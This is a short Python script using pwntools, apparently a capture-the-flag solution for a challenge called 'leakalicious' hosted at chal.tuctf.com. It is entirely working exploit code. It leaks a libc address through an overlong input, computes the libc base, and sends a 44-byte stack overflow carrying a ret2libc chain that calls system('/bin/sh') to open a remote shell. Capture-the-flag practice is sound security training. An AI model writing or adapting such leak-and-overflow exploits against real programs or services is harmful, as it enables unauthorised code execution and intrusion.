from pwn import *

libc = ELF('libc6_2.29-0ubuntu2_i386.so')

# context.terminal = ['termite', '-e']
# p = gdb.debug('./leakalicious')
# p = process('leakalicious')
p = remote('chal.tuctf.com', 30505)

p.sendlineafter('> ', 'A' * 31)
print p.recvline()

libc_base = u32(p.recvline()[:-2]) - libc.symbols['puts']
print hex(libc_base)

sh = libc_base + libc.search("/bin/sh").next()

p.sendlineafter('> ', 'A')
p.sendlineafter('> ', 'A' * 44 + p32(libc_base+libc.symbols['system']) + p32(0x0) + p32(sh))
p.interactive()
